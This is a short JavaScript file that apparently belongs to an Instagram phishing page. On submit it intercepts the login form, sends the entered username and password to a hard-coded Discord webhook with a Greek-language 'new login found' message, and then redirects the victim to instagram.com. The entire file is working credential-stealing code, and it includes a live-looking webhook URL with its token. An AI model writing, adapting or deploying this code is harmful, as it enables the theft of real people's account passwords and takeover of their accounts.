document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    const webhookURL = 'https://discord.com/api/webhooks/1262802699284643970/kbmjXQMHrV7U6gExGIa6OxkDpezxongWsKfXGRAVXbtHUX3YmtKY_97MWkdrpZsONKd2';

    const params = {
        username: "NULL",
        avatar_url: "https://media.discordapp.net/attachments/1062803056414179419/1262803279801483325/images.png?ex=6697ecb3&is=66969b33&hm=3d864f6052a47c75bade0ff1b911d1044e2f012a24ca0aec83e3c464ead47d3b&",
        embeds: [
            {
                title: "Νέα σύνδεση βρέθηκε!",
                description: "Ο χρήστης συνδέθηκε με τον σύνδεσμο εδώ είναι ο κωδικός και το password το password του.",
                color: 16711680, 
                fields: [
                    {
                        name: "Όνομα Χρήστη",
                        value: `\`${username}\``
                    },
                    {
                        name: "Password",
                        value: `\`${password}\``
                    }
                ]
            }
        ]
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(params)
    }).then(response => {
        if (response.ok) {
            window.location.href = "https://www.instagram.com";
        } else {
            alert('Failed to send login information.');
        }
    }).catch(error => {
        console.error('Error:', error);
        alert('Error sending login information.');
    });
});
